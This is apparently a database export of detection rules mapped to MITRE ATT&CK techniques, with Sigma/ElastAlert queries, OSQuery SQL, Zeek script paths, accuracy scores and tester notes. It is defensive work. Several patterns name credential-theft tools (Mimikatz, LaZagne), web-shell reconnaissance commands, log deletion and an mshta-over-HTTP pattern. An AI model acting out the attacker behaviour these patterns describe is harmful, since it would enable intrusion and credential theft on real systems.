50	yes	OSQuery		#FFA500	File monitoring,Process monitoring	"{'accuracy_score': 20}"	T1059.007	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_html_help_spawn.yml", "elastalert": {"name": "html_help_shell_spawn_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*cmd.exe OR *powershell.exe OR *wscript.exe OR *cscript.exe OR *regsvr32.exe OR *wmic.exe OR *rundll32.exe) AND process.parent.executable:\\"C\\\\:\\\\Windows\\\\hh.exe\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)"}}], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%cscript%';", "select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%wscript%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
153	yes			#800080	Process monitoring,Process commandline parameters,Process monitoring	{"accuracy_score": 70}	T1033	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [], "osquery": [], "elasticsiem": []}, "network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "sigma": [{"rule": "T1033", "elastalert": {"name": "T1033", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(event.code:\\"1\\" AND winlog.channel:\\"Microsoft\\\\-Windows\\\\-Sysmon\\\\/Operational\\" AND user.name:\\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\\" AND process.executable:\\"*\\\\\\\\whoami.exe\\")"}}], "realert": {"minutes": 2}, "priority": 2, "description": "Domain user and group enumeration via network reconnaissance."}}, {"rule": "lnx_auditd_user_discovery.yml", "elastalert": {"name": "system_owner_or_user_discovery_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:filebeat AND message:*comm= (whoami OR users OR who))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."}}, {"rule": "run_whoami_as_system", "elastalert": {"name": "run_whoami_as_system", "type": "any", "alert": ["debug"], "index": "winlogbeat-*", "filter": [{"query_string": {"query": "(process.executable:*\\\\\\\\whoami.exe AND user.name:\\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a whoami.exe executed by LOCAL SYSTEM. This may be a sign of a successful local privilege escalation."}}, {"rule": "local_accounts_discovery", "elastalert": {"name": "local_accounts_discovery", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(((process.executable:*\\\\\\\\whoami.exe OR (process.command_line:*useraccount* AND process.command_line:*get* AND process.executable:*\\\\\\\\wmic.exe) OR process.executable:(*\\\\\\\\quser.exe OR *\\\\\\\\qwinsta.exe) OR (process.command_line:*\\\\/list* AND process.executable:*\\\\\\\\cmdkey.exe) OR (process.command_line:*\\\\/c* AND process.command_line:*dir\\\\ * AND process.command_line:*\\\\\\\\Users\\\\\\\\* AND process.executable:*\\\\\\\\cmd.exe)) AND (NOT (process.command_line:(*\\\\ rmdir\\\\ *)))) OR ((process.command_line:*user* AND process.executable:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe)) AND (NOT (process.command_line:(*\\\\/domain* OR *\\\\/add* OR *\\\\/delete* OR *\\\\/active* OR *\\\\/expires* OR *\\\\/passwordreq* OR *\\\\/scriptpath* OR *\\\\/times* OR *\\\\/workstations*)))))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Local accounts, System Owner/User discovery using operating systems utilities"}}, {"rule": "local_groups_discovery", "elastalert": {"name": "local_groups_discovery", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*\\\\/groups) OR (process.command_line:(*\\\\/etc\\\\/group*) AND process.executable:(*\\\\/cat)))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects enumeration of local system groups"}}, {"rule": "local_groups_discovery_0", "elastalert": {"name": "local_groups_discovery_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.executable:(*\\\\/dscacheutil) AND process.args:*\\\\-q* AND process.args:*group*) OR (process.executable:(*\\\\/cat) AND process.args:(*\\\\/etc\\\\/group*)) OR (process.executable:(*\\\\/dscl) AND process.args:*\\\\-list* AND process.args:*\\\\/groups*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects enumeration of local system groups"}}, {"rule": "net_exe_execution", "elastalert": {"name": "net_exe_execution", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe) AND process.command_line:(*\\\\ group* OR *\\\\ localgroup* OR *\\\\ user* OR *\\\\ view* OR *\\\\ share* OR *\\\\ accounts* OR *\\\\ stop\\\\ *))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects execution of Net.exe, whether suspicious or benign."}}, {"rule": "dridex_process_pattern_0", "elastalert": {"name": "dridex_process_pattern_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(event.code:(\\"4688\\" OR \\"1\\") AND ((process.executable.:*\\\\\\\\svchost.exe AND process.args.:*C\\\\:\\\\\\\\Users\\\\\\\\* AND process.args.:*\\\\\\\\Desktop\\\\\\\\*) OR (process.parent.executable.:*\\\\\\\\svchost.exe AND ((process.executable.:*\\\\\\\\whoami.exe AND process.args.:*all*) OR (process.executable.:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe) AND process.args.:*view*)))))"}}], "realert": {"minutes": 0}, "priority": 1, "description": "Detects typical Dridex process patterns"}}, {"rule": "run_whoami_showing_privileges", "elastalert": {"name": "run_whoami_showing_privileges", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:*\\\\/priv* AND process.executable:*\\\\\\\\whoami.exe)"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a whoami.exe executed with the /priv command line flag instructing the tool to show all current user privieleges. This is often used after a privilege escalation attempt."}}, {"rule": "system_owner_or_user_discovery", "elastalert": {"name": "system_owner_or_user_discovery", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(a0:(\\"users\\" OR \\"w\\" OR \\"who\\") AND type:\\"EXECVE\\")"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."}}, {"rule": "webshell_detection_with_command_line_keywords", "elastalert": {"name": "webshell_detection_with_command_line_keywords", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.parent.executable:(*\\\\\\\\w3wp.exe OR *\\\\\\\\php\\\\-cgi.exe OR *\\\\\\\\nginx.exe OR *\\\\\\\\httpd.exe) OR process.parent.executable:(*\\\\\\\\apache* OR *\\\\\\\\tomcat*)) AND (((process.command_line:(*\\\\ user\\\\ * OR *\\\\ use\\\\ * OR *\\\\ group\\\\ *) AND process.executable:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe)) OR (process.command_line:*\\\\ \\\\-n\\\\ * AND process.executable:*\\\\\\\\ping.exe) OR process.command_line:(*&cd&echo* OR *cd\\\\ \\\\/d\\\\ *)) OR (process.command_line:*\\\\ \\\\/node\\\\:* AND process.executable:*\\\\\\\\wmic.exe) OR process.executable:(*\\\\\\\\whoami.exe OR *\\\\\\\\systeminfo.exe OR *\\\\\\\\quser.exe OR *\\\\\\\\ipconfig.exe OR *\\\\\\\\pathping.exe OR *\\\\\\\\tracert.exe OR *\\\\\\\\netstat.exe OR *\\\\\\\\schtasks.exe OR *\\\\\\\\vssadmin.exe OR *\\\\\\\\wevtutil.exe OR *\\\\\\\\tasklist.exe) OR process.command_line:(*\\\\ Test\\\\-NetConnection\\\\ * OR *dir\\\\ \\\\\\\\*)))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects certain command line parameters often used during reconnaissance activity via web shells"}}, {"rule": "whoami_execution", "elastalert": {"name": "whoami_execution", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:*\\\\\\\\whoami.exe OR process.pe.original_file_name:\\"whoami.exe\\")"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detects the execution of whoami, which is often used by attackers after exloitation / privilege escalation but rarely used by administrators"}}, {"rule": "run_whoami_as_system_0", "elastalert": {"name": "run_whoami_as_system_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(event.code:\\"1\\" AND winlog.channel:\\"Microsoft\\\\-Windows\\\\-Sysmon\\\\/Operational\\" AND user.name:\\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\\" AND process.executable:\\"*\\\\\\\\whoami.exe\\")"}}], "realert": {"minutes": 2}, "priority": 2, "description": "Detects a whoami.exe executed by SYSTEM. This may be a sign of a successful privilege escalation."}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%whoami%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}]}}}}	2021-07-26 17:47:08.01239+00
114	no	other	Not found anything. This is for MacOS	#FFFFFF	Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1037.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
115	no	yaml		#FFFFFF	Process commandline parameters,Process monitoring	"{'accuracy_score': 0}"	T1218.009	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_possible_applocker_bypass.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
127	yes	OSQuery		#008000	Process monitoring,Process commandline parameters	"{'accuracy_score': 90}"	T1550.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from powershell_events where script_text like '%Invoke-Mimikatz%';", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%mimikatz%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
134	yes	OSQuery	Remote login to victim machine. Make sure user is signed out from machine first.	#800080	Authentication logs	{"accuracy_score": 70}	T1078.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select datetime(time,'unixepoch','UTC') as time_utc,host,user,tty,pid,type from logged_in_users;", "select datetime(time,'unixepoch','UTC') as time_utc,host,username,tty,pid,type from last;"]}, "windows": {"other": [], "sigma": [{"rule": "win_admin_rdp_login.yml", "elastalert": {"name": "admin_user_remote_logon_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(event_id:\\"4624\\" AND logon_type:\\"10\\"AND logon_authentication_package_nam:\\"Negotiate\\" AND user_name:ieuser)"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detect remote login by Administrator user (depending on internal pattern)."}}], "osquery": ["select * from users;", "select datetime(time,'unixepoch','UTC') as time_utc,host,user,tty,pid,type from logged_in_users;"], "elasticsiem": []}}}}}	2021-07-19 07:24:09.336452+00
97	yes	OSQuery,other	["1. at.exe requires older versions of windows lesser than 10."]	#800080	File monitoring	{"accuracy_score": 55}	T1053.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_report.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb1_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb2_detect.zeek"], "sigma": [{"rule": "mitre_bzar_indicators_for_execution_0", "elastalert": {"name": "mitre_bzar_indicators_for_execution_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarOpenPolicy2\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrConnect4\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSUnbind\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSCrackNames\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSBind\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarClose\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarLookupNames\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarGetUserName\\") OR (dce_rpc.endpoint:\\"srvsvc\\" AND dce_rpc.operation:\\"NetrShareEnum\\") OR (dce_rpc.endpoint:\\"epmapper\\" AND dce_rpc.operation:\\"ept_map\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrCloseHandle\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrConnect4\\") OR (dce_rpc.endpoint:\\"JobAdd\\" AND dce_rpc.operation:\\"atsvc\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcEnableTask\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcRegisterTask\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcRun\\") OR (dce_rpc.endpoint:\\"IWbemServices\\" AND dce_rpc.operation:\\"ExecMethod\\") OR (dce_rpc.endpoint:\\"IWbemServices\\" AND dce_rpc.operation:\\"ExecMethodAsync\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"CreateServiceA\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"CreateServiceW\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"StartServiceA\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"StartServiceW\\"))"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE"}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%at.exe%';"], "elasticsiem": []}, {"zeek": [], "other": [], "sigma": [{"rule": "", "elastalert": ""}], "osquery": [], "elasticsiem": []}]}}}}	2021-07-28 15:58:30.529561+00
106	yes	OSQuery		#800080	Process commandline parameters,Process monitoring	"{'accuracy_score': 50}"	T1003.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.name LIKE '%lazagne%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
22	no	OSQuery		#FFFFFF	Process monitoring,Process use of network	"{'accuracy_score': 0}"	T1205	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"]}, "windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
125	no	OSQuery		#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1011	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
28	yes	OSQuery	["1. Reference for osquery https://afaghhosting.net/blog/how-to-monitor-your-linux-server-using-osquery/ "]	#800080	Process monitoring,Process commandline parameters	"{'accuracy_score': 50}"	T1053.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [], "osquery": ["SELECT * from crontab;"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
141	no	other	Not found anything.	#FFFFFF	Process monitoring,Binary file metadata	"{'accuracy_score': 0}"	T1554	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"1.Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment. Look for changes to client software that do not correlate with known software or patch cycles.\\n2. Consider monitoring for anomalous behavior from client applications, such as atypical module loads, file reads/writes, or network connections.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
158	no	OSQuery		#FFFFFF	Process monitoring,File monitoring	"{'accuracy_score': 0}"	T1113	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["SELECT * FROM users CROSS JOIN chrome_extensions USING (uid) WHERE identifier='fdcgdnkidjaadafnichfpabhfomcebme';", "SELECT * FROM users CROSS JOIN chrome_extensions USING (uid) WHERE identifier='fcfhplploccackoneaefokcmbjfbkenj';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
139	yes	OSQuery		#008000	Process monitoring	{"accuracy_score": 90}	T1124	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "sigma": [{"rule": "discovery_of_a_system_time", "elastalert": {"name": "discovery_of_a_system_time", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((event.code:\\"1\\" AND winlog.channel:\\"Microsoft\\\\-Windows\\\\-Sysmon\\\\/Operational\\") AND ((process.executable:(\\"*\\\\\\\\net.exe\\" OR \\"*\\\\\\\\net1.exe\\") AND process.command_line:\\"*time*\\") OR (process.executable:\\"*\\\\\\\\w32tm.exe\\" AND process.command_line:\\"*tz*\\") OR (process.executable:\\"*\\\\\\\\powershell.exe\\" AND process.command_line:\\"*Get\\\\-Date*\\")))"}}], "realert": {"minutes": 2}, "priority": 2, "description": "Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system."}}], "osquery": [], "elasticsiem": []}}}}}	2021-07-26 17:45:25.638814+00
13	yes	OSQuery		#800080	Process commandline parameters,Windows Registry	"{'accuracy_score': 70}"	T1562.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_netsh_allow_port_rdp.yml", "elastalert": {"name": "Sysmon_01aeb693-138d-49d2-9403-c4f52d7d3d62_0 Netsh RDP Port Opening", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query": {"query_string": {"query": "(event_id:\\"1\\" AND process.command_line:*netsh* AND ((process.command_line:*firewall add portopening* AND process.command_line:*tcp 3389*) OR (process.command_line:*advfirewall firewall add rule* AND process.command_line:*allow* AND process.command_line:*tcp* AND process.command_line:*3389*)))"}}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects netsh commands that opens the port 3389 used for RDP, used in Sarwent Malware", "timestamp_field": "etl_processed_time"}}], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%netsh.exe%';", "select name,type,data from registry where key='HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
15	no	OSQuery		#FFFFFF	Process monitoring,Process commandline parameters,Process monitoring,Process use of network	"{'accuracy_score': 0}"	T1041	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select p.name, p.path, lp.port, lp.address, lp.protocol  from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"]}, "windows": {"other": [], "sigma": [], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.name LIKE '%lazagne%';", "select p.name, p.path, lp.port, lp.address, lp.protocol from listening_ports lp LEFT JOIN processes p ON lp.pid = p.pid WHERE lp.port != 0 AND p.name != '';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
58	yes	other,OSQuery,yaml	ELK SIEM rules added	#008000	File monitoring,Process monitoring,Process commandline parameters	{"accuracy_score": 90}	T1564.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"osquery": ["select * from file_events where target_path like '%/.%';"], "elasticsiem": [{"name": "Creation of Hidden Files and Directories", "query": "process where event.type in (\\"start\\", \\"process_started\\") and\\n  process.args regex~ \\"\\\\.[a-zA-Z0-9_\\\\-][a-zA-Z0-9_\\\\-\\\\.]{1,254}\\" and\\n  not process.name in (\\"ls\\", \\"find\\") and not user.name: \\"root\\""}]}, "windows": {"other": [".."], "sigma": [{"rule": "win_attrib_hiding_files.yml", "elastalert": {"name": "hiding_files_with_attrib_exe_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.command_line:(\\"*+h*\\" OR \\"*+s*\\")  AND process.executable:*attrib.exe) AND NOT (process.executable:*desktop.ini OR (process.command_line:*.cui AND process.parent.executable:*cmd.exe AND process.parent.command_line:*.bat)) AND agent.type:winlogbeat)"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects usage of attrib.exe to hide files from users."}}], "osquery": ["select * from file where directory = 'C:\\\\Windows\\\\Prefetch' and filename like '%attrib.exe%';"], "elasticsiem": [{"name": "Adding Hidden File Attribute via Attrib", "query": "event.category:process and event.type:(start or process_started) and process.name:attrib.exe and process.args:+h"}]}}}}}	2021-07-19 16:11:08.616891+00
79	yes		1. Linux yml rules are working on HELK. \n2. shell_history Osquery is not able to detect the command fired by other users.\n3. For sigma rules need to try AuditBeat, because auditd is doesn't to capture commands fired on shell.	#800080	Process commandline parameters,Process monitoring,File monitoring	{"accuracy_score": 70}	T1222.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"sigma": [{"rule": "lnx_file_or_folder_permissions.yml", "elastalert": {"name": "file_or_folder_permissions_change_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:filebeat AND message:(*changes* AND (*chmod* OR *chown* OR *chattr*)))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects"}}], "osquery": ["select * from process_events where cmdline like '%chmod%' or '%chown%';", "select uid, command from users join shell_history using (uid);", "select * from process_events where cmdline like '%chattr%';", "select usr.username, sht.command, sht.history_file from shell_history sht JOIN users usr ON sht.uid = usr.uid WHERE sht.uid IN (SELECT uid from users);"]}, "windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": [{"name": "File Permission Modification by non-root user", "query": "process where event.type:(\\"start\\", \\"process_started\\") and\\n  process.name:(\\"chmod\\", \\"chown\\", \\"chattr\\", \\"chgrp\\") and\\n  not user.name: \\"root\\""}]}}}}}	2021-07-19 11:47:00.826814+00
143	no		Use sysmong logs and winlogbeat to get events - 1074,6006	#FFFFFF	Windows event logs	"{'accuracy_score': 0}"	T1529	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [""], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
142	yes	OSQuery		#800080	Process monitoring,Process commandline parameters	"{'accuracy_score': 50}"	T1003.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.name LIKE '%lazagne%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
83	yes	OSQuery	Need to find ways to detect process interaction with files in /var/log/*.\nMacOS detection not tried.	#800080	File monitoring	{"accuracy_score": 60}	T1070.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_clear_logs.yml", "elastalert": {"name": "clear_linux_logs", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(message:(\\"*\\\\/var\\\\/log*\\" OR \\"*\\\\/var\\\\/spool\\\\/mail*\\") AND message:(\\"*\\\\/rm\\" OR \\"*\\\\/shred\\"))"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detects clear logs"}}], "osquery": ["select * from process_events where (cmdline like '%rm %' and cmdline like '%/var/log%');", "select * from file_events where target_path like '/var/log/%' and (action='DELETED' OR size=0);"], "elasticsiem": []}, "windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-19 05:45:44.216334+00
5	no	other	MacOS Dependent.	#FFFFFF	File monitoring,Process monitoring	"{'accuracy_score': 0}"	T1037.005	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["[\\"The /Library/StartupItems folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.\\n\\nMonitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
9	no	OSQuery		#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1216.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%cscript%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
12	no	yaml		#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1127.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_possible_applocker_bypass.yml", "elastalert": ""}], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
31	no	OSQuery		#FFFFFF	Process monitoring	"{'accuracy_score': 0}"	T1012	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_apt_babyshark.yml", "elastalert": {"name": "baby_shark_activity_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:(\\"reg query \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Terminal\\\\ Server\\\\Client\\\\Default\\"\\" OR powershell.exe mshta.exe http* OR \\"cmd.exe /c taskkill /im cmd.exe\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects activity that could be related to Baby Shark malware"}}], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%reg%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
